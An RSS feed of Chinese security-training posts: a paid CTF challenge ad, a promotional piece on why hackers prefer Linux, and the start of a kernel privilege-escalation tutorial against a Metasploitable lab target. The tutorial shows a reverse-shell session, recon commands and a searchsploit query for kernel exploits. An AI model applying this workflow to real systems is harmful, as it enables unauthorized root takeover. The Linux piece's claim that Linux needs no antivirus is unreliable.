<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>二向箔安全学院</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/</link>
<description>培养黑客式思维: twosecurity.cn 培养黑客式思维: twosecurity.cn</description>
<language>zh-cn</language>
<lastBuildDate>Fri, 23 Aug 2019 13:15:58 +0800</lastBuildDate>
<item>
<title>人生没有白做的题，每一道都算数！</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-08-23-79420498.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/79420498&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cce2319a5e4429b401d3a0eb1fa25e57_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;★ 你是否也有这样的困扰？★&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;都说网络安全入门容易，能一直进步却很难。&lt;/p&gt;&lt;p&gt;一个网络安全学习者能否一直坚持学习，直接可以判定他能到达怎样的高度。&lt;/p&gt;&lt;p&gt;而想要提高自身的水平，&lt;b&gt;实战是必不可少的。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;听到很多咨询的朋友反应，自己花费了大量的精力去自学，收效却微乎其微，其实原因有很多，比如：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;学的太零散，没有体系化；&lt;/li&gt;&lt;li&gt;主要以理论知识为主，实际操作太少；&lt;/li&gt;&lt;li&gt;遇到问题，没有人解疑答惑；&lt;/li&gt;&lt;li&gt;一个知识点还没弄透彻，又开始学习另一个知识点了；&lt;/li&gt;&lt;li&gt;学完一个知识点后，没有及时地进行自我检测，导致自我感觉良好的假象；&lt;/li&gt;&lt;li&gt;会做渗透测试，会挖洞，但是层次还很有限，没办法突破那个瓶颈……&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;面对如此的境地，宝宝们抓破了脑袋也不知道怎么办！&lt;/p&gt;&lt;p&gt;现在，为了帮助大家破解这个大难题，我们推出了&lt;b&gt;《网络空间安全攻防》的入门版、进阶版和深度版 + 新一届的 CTF 挑战赛。&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;划重点！！！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;《网络空间安全攻防》的入门版、进阶版和深度版，总有一款适合你！&lt;/p&gt;&lt;p&gt;&lt;b&gt;入门版：戳&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/courseColumn.html%3Fq_id%3Dp_5d11e7d0bc2b4_anVPKpXx%26q_type%3D6&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;这个小可爱&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;进阶版：戳&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/courseColumn.html%3Fq_id%3Dp_5d284acee763f_BhDvp6v5%26q_type%3D6&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;这个中可爱&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;深度版：戳&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/courseColumn.html%3Fq_id%3Dp_5d26958649016_VGA7sCFC%26q_type%3D6&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;这个大可爱&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;其他课程均可预定席位，享早鸟优惠！&lt;/p&gt;&lt;p&gt;&lt;b&gt;往期回顾：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s%3F__biz%3DMzU2NjE2NjIxNg%3D%3D%26mid%3D2247484305%26idx%3D1%26sn%3Df6f6ae66a5edb4b19da09db4aed3e50d%26scene%3D21%23wechat_redirect&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;报报报我大哥的名字&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;报名二向箔安全任意课程&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;免费参与 CTF 打卡挑战赛&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;成功完成打卡目标&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;即可返30%学费&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;再划重点！！！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;本次 CTF 打卡挑战赛可单独购买&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;专享价：199元&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;成功完成打卡目标&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;即可获得全额退款&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;或价值500元的课程优惠券&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;两者任选其一！&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;★ 往期精彩回顾 ★&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;勤劳的售后小姐姐&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-deb91a2085c4c4476aac1888d699e86e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;591&quot; data-rawheight=&quot;525&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;591&quot; data-original=&quot;https://pic3.zhimg.com/v2-deb91a2085c4c4476aac1888d699e86e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-deb91a2085c4c4476aac1888d699e86e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;591&quot; data-rawheight=&quot;525&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;591&quot; data-original=&quot;https://pic3.zhimg.com/v2-deb91a2085c4c4476aac1888d699e86e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-deb91a2085c4c4476aac1888d699e86e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;结交志同道合的朋友&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bd2bd4c433e5742c8e1f1c594dfe1d91_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;639&quot; data-rawheight=&quot;417&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;639&quot; data-original=&quot;https://pic2.zhimg.com/v2-bd2bd4c433e5742c8e1f1c594dfe1d91_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bd2bd4c433e5742c8e1f1c594dfe1d91_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;639&quot; data-rawheight=&quot;417&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;639&quot; data-original=&quot;https://pic2.zhimg.com/v2-bd2bd4c433e5742c8e1f1c594dfe1d91_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-bd2bd4c433e5742c8e1f1c594dfe1d91_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3989898fffb90d8b750a0897818bdc6d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;623&quot; data-rawheight=&quot;488&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;623&quot; data-original=&quot;https://pic2.zhimg.com/v2-3989898fffb90d8b750a0897818bdc6d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3989898fffb90d8b750a0897818bdc6d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;623&quot; data-rawheight=&quot;488&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;623&quot; data-original=&quot;https://pic2.zhimg.com/v2-3989898fffb90d8b750a0897818bdc6d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-3989898fffb90d8b750a0897818bdc6d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;优秀学员&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f3022ad7b3ade7b380dfd9d7ada9e05c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;597&quot; data-rawheight=&quot;426&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;597&quot; data-original=&quot;https://pic1.zhimg.com/v2-f3022ad7b3ade7b380dfd9d7ada9e05c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f3022ad7b3ade7b380dfd9d7ada9e05c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;597&quot; data-rawheight=&quot;426&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;597&quot; data-original=&quot;https://pic1.zhimg.com/v2-f3022ad7b3ade7b380dfd9d7ada9e05c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-f3022ad7b3ade7b380dfd9d7ada9e05c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;★ 时间安排 ★&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;一、报名时间&lt;/b&gt;&lt;/p&gt;&lt;p&gt;即刻起至8月31日&lt;/p&gt;&lt;p&gt;&lt;b&gt;二、打卡时间&lt;/b&gt;&lt;/p&gt;&lt;p&gt;本次打卡时间持续一个月，9月1日—9月30日。&lt;/p&gt;&lt;p&gt;&lt;b&gt;三、每日打卡推送时间&lt;/b&gt;&lt;/p&gt;&lt;p&gt;每日0：00和8：00两个时间点推送&lt;/p&gt;&lt;p&gt;&lt;b&gt;四、每日打卡起止时间&lt;/b&gt;&lt;/p&gt;&lt;p&gt;每日0：00开始打卡，23：59停止打卡&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;★  CTF 打卡挑战赛 ★ &lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt; 具体细则 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;一、打卡内容&lt;/b&gt;&lt;/p&gt;&lt;p&gt;题目的内容以 Web 安全为主~&lt;/p&gt;&lt;p&gt;周一到周五为正常题，周末为特别题，有难度才有挑战~&lt;/p&gt;&lt;p&gt;&lt;b&gt;二、报名方式&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;方式一：购买任意主课程，免费参与打卡&lt;/b&gt;&lt;/p&gt;&lt;p&gt;购买课程后，联系佳佳~发放优惠券，进入打卡活动。&lt;/p&gt;&lt;p&gt;&lt;b&gt;方式二：单独购买，专享价 199 RMB&lt;/b&gt;&lt;/p&gt;&lt;p&gt;在公众号下角的“&lt;b&gt;公开课&lt;/b&gt;”名目下，点击“&lt;b&gt;第二届 CTF 打卡挑战赛&lt;/b&gt;”，报名进入活动。&lt;/p&gt;&lt;p&gt;&lt;b&gt;方式三：拼团购买，团购价 149 RMB&lt;/b&gt;&lt;/p&gt;&lt;p&gt;本文最后附拼团购买链接，&lt;b&gt;拼团时间截至为本周末&lt;/b&gt;。&lt;/p&gt;&lt;p&gt;* 进入打卡活动后，请耐心等候，9月1日正式开始打卡活动。&lt;/p&gt;&lt;p&gt;&lt;b&gt;三、打卡形式&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;如何打卡：&lt;/b&gt;以发表日记的形式进行打卡，先输入正确的 Flag，然后附上自己的解题思路~&lt;/p&gt;&lt;p&gt;&lt;b&gt;打卡后：&lt;/b&gt;可以查看、评论其他小伙伴的打卡日记内容，在这里，你会发现很多不一样的思路~&lt;/p&gt;&lt;p&gt;&lt;b&gt;打卡是否成功：&lt;/b&gt;由助教审核答案，给出评论~&lt;/p&gt;&lt;p&gt;&lt;b&gt;四、推荐有奖&lt;/b&gt;&lt;/p&gt;&lt;p&gt;为了让更多的朋友参与进来，人越多越好玩儿嘛，进入公众号里&lt;b&gt;技能提升&lt;/b&gt;板块的“&lt;b&gt;第二届 CTF 打卡挑战赛&lt;/b&gt;”，点击右上角可进行推广返佣金，每成功推荐一人购买，可返挑战赛价格的20%，好玩儿又有钱赚，你还不来！&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;★ 学费/奖金返还制 ★&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;成功完成9月打卡目标的学员，该返学费的返学费，该返奖金的返奖金。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;* 特殊情况&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如若学员里没有成功打卡30日的，则选取表现优秀者进行奖励！&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;★ 符合报名资格 ★&lt;/b&gt;&lt;/p&gt;&lt;p&gt;1、参与过第一届打卡活动的老学员，不可免费参与第二届打卡活动，可进行购买参与。&lt;/p&gt;&lt;p&gt;2、没有参加过第一届打卡活动的老学员和新预定席位的学员，可免费参与第二届。（联系佳佳~）&lt;/p&gt;&lt;p&gt;3、自愿接受三十日打卡目标挑战，想提高自身水平的朋友。&lt;/p&gt;&lt;p&gt;4、想从事网络安全方面的工作，想要深入学习了解，并且结识一些行业大牛和同行，进入安全圈的朋友，在这里，大家能相互学习和得到更多资源和机会。&lt;/p&gt;&lt;p&gt;* &lt;b&gt;请认真并仔细阅读以上报名资格。&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a8f10b59139a7d343010ec83324551c0_b.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;20&quot; data-thumbnail=&quot;https://pic1.zhimg.com/v2-a8f10b59139a7d343010ec83324551c0_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-a8f10b59139a7d343010ec83324551c0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a8f10b59139a7d343010ec83324551c0_b.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;20&quot; data-thumbnail=&quot;https://pic1.zhimg.com/v2-a8f10b59139a7d343010ec83324551c0_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic1.zhimg.com/v2-a8f10b59139a7d343010ec83324551c0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-a8f10b59139a7d343010ec83324551c0_b.gif&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;★ 报名须知（必看） ★&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;● 本次挑战为学习类虚拟产品，一经报名无法退订，敬请理解。&lt;/p&gt;&lt;p&gt;● 报名后请务必在打卡页面内添加老师微信，相关事宜会由老师在朋友圈进行通知。&lt;/p&gt;&lt;p&gt;● 此次挑战赛没有名额限制，8月31日截至报名，请大家及时参与，若错过报名时间，只能等待下一期报名哦！&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-94caf9d452c5463f384e5ae52444ee97_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;603&quot; data-rawheight=&quot;262&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;603&quot; data-original=&quot;https://pic4.zhimg.com/v2-94caf9d452c5463f384e5ae52444ee97_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-94caf9d452c5463f384e5ae52444ee97_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;603&quot; data-rawheight=&quot;262&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;603&quot; data-original=&quot;https://pic4.zhimg.com/v2-94caf9d452c5463f384e5ae52444ee97_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-94caf9d452c5463f384e5ae52444ee97_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全</author>
<guid isPermaLink="false">2019-08-23-79420498</guid>
<pubDate>Fri, 23 Aug 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>真正的黑客为什么喜欢 Linux 而不是其他操作系统？</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-08-21-79112670.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/79112670&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cbbd2bb26fe52b653185eb73595339fb_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;可能我们会说 Linux 的&lt;b&gt;开源&lt;/b&gt;特性是迫使黑客使用 Linux 的主要原因，但它并不是全部。&lt;/p&gt;&lt;p&gt;首先，我们要知道黑客是一群什么样的人?&lt;/p&gt;&lt;ul&gt;&lt;li&gt;黑客是指在计算机系统或计算机网络中寻找和利用弱点并未经授权访问数据的人。&lt;/li&gt;&lt;li&gt;黑客之所以成为黑客，有很多原因，如利益，反抗，挑战，享受乐趣或者测试网络和系统的性能来判定它们能够承受入侵的强弱程度。&lt;/li&gt;&lt;li&gt;或许我们可以说黑客是一个“ &lt;b&gt;聪明的程序员&lt;/b&gt; ”。因为真正的黑客喜欢的是编程而不是理论化的东西。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;因此，从上述观点可以清楚地看出，黑客需要一个能提供最高安全性来测试技能的操作系统，如此，黑客才能更安全地在其上进行活动。&lt;/p&gt;&lt;p&gt;所以什么才是黑客最喜欢的操作系统，是 Windows 还是 Mac？当然都不是，它们都在忙着监视用户……&lt;/p&gt;&lt;p&gt;所有类型的黑客或黑客组织如：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%25E5%258C%25BF%25E5%2590%258D%25E8%2580%2585&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Anonymous&lt;/a&gt;，&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Lizard_Squad&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Lizard Squad&lt;/a&gt; 等都选择使用 Linux 进行黑客攻击。这些黑客选择 Linux 清楚地说明了 Linux 在全世界的影响力。除了黑客攻击之外，Linux 还几乎支持所有计算机的运行。&lt;/p&gt;&lt;h2&gt;真正的黑客都喜欢 Linux &lt;/h2&gt;&lt;h2&gt;1. 开源&lt;/h2&gt;&lt;p&gt;Linux 作为一个自由和开放源码的类 UNIX 操作系统，它就像是完全受个人控制的操作系统。因为您可以根据个人需要修改 Linux 的源代码，并且在此操作系统上运行的大多数应用程序也是开源的。Windows 和 Mac 可没有这种功能。&lt;/p&gt;&lt;h2&gt;2. 不需要定期重启&lt;/h2&gt;&lt;p&gt;安装软件后或 Windows 更新后，PC 始终要求重新启动以使其完全正常运行。而 Linux 则不需要定期重启来保持其性能水平。所以黑客能使用那种每次安装软件后频繁重启的操作系统吗？不能的啊。&lt;/p&gt;&lt;h3&gt;3. 正常的系统配置：&lt;/h3&gt;&lt;p&gt;系统配置在 Linux 中不是什么大问题，任何计算机上都可以运行 Linux - 从低成本 PC 到超级计算机。目前可用的笔记本电脑/ PC只要具有正常的系统配置，皆可以运行 Linux 操作系统。&lt;/p&gt;&lt;h3&gt;4. 不会因为内存而减速：&lt;/h3&gt;&lt;p&gt;这也是 Linux 的一个显著特征。内存不足的情况下，在 Windows 上运行程序，特别是大程序就会很吃力，而 Linux 则不会因为内存不足而影响系统的性能。&lt;/p&gt;&lt;h3&gt;5. 便携性：&lt;/h3&gt;&lt;p&gt;使用 Linux 的另一个优点是它的便携性。Linux 发行版即使在没有安装的情况下，也可以和 Windows 或 Mac 或任何其他操作系统一起使用。是的，Linux 随时随地都在你身边。&lt;/p&gt;&lt;p&gt;因为几乎所有的 Linux 发行版都具有 Live 启动功能。因此，您可以在不安装 Linux 的情况下进入任何 PC，只需要下载存储在 USB 闪存驱动器或 CD / DVD 中的 Linux 发行版 ISO 文件即可。&lt;/p&gt;&lt;h3&gt;6. 安装简便快捷：&lt;/h3&gt;&lt;p&gt;初学者可能很难。&lt;/p&gt;&lt;p&gt;对于黑客来说，Linux 真的很方便 — 因为黑客总是会切换他们的操作系统 — 而 Linux 发行版是最容易安装的。Linux 的安装速度比其他操作系统都快。另外，此操作系统的启动时间也比某些操作系统快得多。&lt;/p&gt;&lt;h3&gt;7. 兼容性：&lt;/h3&gt;&lt;p&gt;Linux 发行版支持所有 Unix 软件包，并且支持其中所有常见的文件格式。甚至你可以在模拟器的帮助下运行 Windows 软件。&lt;/p&gt;&lt;h3&gt;8. 多任务处理：&lt;/h3&gt;&lt;p&gt;Linux 旨在同时执行多项操作。与 Windows 不同，从 PC 端复制或传输文件时，它不会切断或减慢其他的工作 — 而且，可以在不干扰主进程的情况下轻松地就完成很多其他的工作。&lt;/p&gt;&lt;h3&gt;9. 网络和谐：&lt;/h3&gt;&lt;p&gt;Linux 是开源的，并且它还提供了许多可用于测试网络渗透的库和命令。另外，此操作系统网络备份比其他任何操作系统都快。&lt;/p&gt;&lt;h3&gt;10. 隐私与安全：&lt;/h3&gt;&lt;p&gt;你有没有想过为什么 Linux 不需要防病毒软件？而 Windows 三天两头又在打补丁安装系统安全更新……&lt;/p&gt;&lt;p&gt;Linux 不需要防病毒，因为 Linux 是最安全的操作系统&lt;b&gt;，&lt;/b&gt;而且它本身漏洞就非常少。&lt;/p&gt;&lt;p&gt;而另一个特征是 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//techlog360.com/secure-linux-distributions-privacy-protection/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Linux 具有安全性和隐私性&lt;/a&gt;  — 每个黑客都喜欢在黑暗中，所以匿名是每个黑客的重要议程。借助 Linux 中的一些工具，黑客可以完全隐蔽在引擎盖下。&lt;/p&gt;&lt;p&gt;可能你会说 — 在 Windows 中也可以使用 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//listbygeek.com/free-vpn-services/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;VPN服务&lt;/a&gt;。但事实是即使你使用 VPN，也无法隐藏在 Windows 间谍眼中。&lt;/p&gt;&lt;h2&gt;一句话&lt;/h2&gt;&lt;p&gt;如果你想成为一名真正的黑客，那就卸载你的 Windows，安装 Linux 吧。&lt;/p&gt;&lt;p&gt;如果你是一个想成为黑客进入 Linux 世界而离不开 Windows 的初学者，那么可以选择双启动。双启动意味着安装两个操作系统，它们可以在同一台 PC 上独立运行。&lt;/p&gt;&lt;p&gt;来源：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//techlog360.com/real-hackers-prefer-linux-distro/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;techlog360.com/real-hac&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;kers-prefer-linux-distro/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;</description>
<author>二向箔安全</author>
<guid isPermaLink="false">2019-08-21-79112670</guid>
<pubDate>Wed, 21 Aug 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>Linux 内核漏洞提权</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-08-20-78943079.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/78943079&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-effc0df18872479281d08a32eed4b778_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;获取 root 权限是 Linux 漏洞利用的终极目标。跟 Windows 中的 System 用户一样，root 用户拥有对操作系统的所有管理权限。在渗透中，有时候成功利用某些漏洞只会获取一个低权限用户，所以需要使用提权技巧，提升到权限更高的 root 用户，完全控制整个系统。&lt;/p&gt;&lt;p&gt;一般来说，获取到低权限 shell 后我们通常会做下面几件事：&lt;br/&gt;&lt;br/&gt;1. 检测操作系统的发行版本&lt;br/&gt;2. 查看内核版本&lt;br/&gt;3. 检测当前用户权限&lt;br/&gt;4. 列举Suid文件&lt;br/&gt;5. 查看已经安装的包，程序，运行的服务，过期的版本可能有漏洞&lt;/p&gt;&lt;p&gt;现在，我们来进行实战！&lt;/p&gt;&lt;h2&gt;第一步 信息收集&lt;/h2&gt;&lt;p&gt;我们将使用一个内核 exp 提权到 root 用户，首先我们需要搜集靶机的一一些信息。由于我们已经获取到了一个 shell，我们可以执行 &lt;b&gt;uname –a&lt;/b&gt; 命令来查看内核版本，也可以使用 &lt;b&gt;lsb_release –a&lt;/b&gt; 命令来查看当前系统发行版的具体版本号。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;[*] Started reverse TCP handler on 172.16.1.100:4444
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (36 bytes) to 172.16.1.102
[*] Command shell session 2 opened (172.16.1.100:4444 -&amp;gt; 172.16.1.102:49499) at 2018-07-16 13:55:15 -0500

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
lsb_release -a
No LSB modeuls are available.
Distributor ID: Ubuntu
Description:    Ubuntu 8.04
Release:        8.04
Codename:       hardy&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在这里，我们可以查找能利用的 exp 。刚刚执行的命令显示运行的系统是 &lt;b&gt;Ubuntu8.0.4&lt;/b&gt;，内核版本是&lt;b&gt;2.6.24&lt;/b&gt;。&lt;/p&gt;&lt;p&gt;kali 自带本地版本的 &lt;b&gt;Exploit-DB &lt;/b&gt;库，这个库包含了各种 exp 和代码。&lt;/p&gt;&lt;p&gt;我们可以使用 &lt;b&gt;SearchSploit&lt;/b&gt; 工具（这个工具非常有用）来访问这个 exp 库，只要在终端中输入 &lt;b&gt;searchsploit&lt;/b&gt; 即可运行。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;root@nullbyte:~# searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23 | exploits/linux_x86/local/42276.c
Linux Kernel 2.2.25/2.4.24/2.6.2 - &amp;#39;mremap()&amp;#39; Local Privilege Escala | exploits/linux/local/160.c
Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Es | exploits/linux/local/22362.c
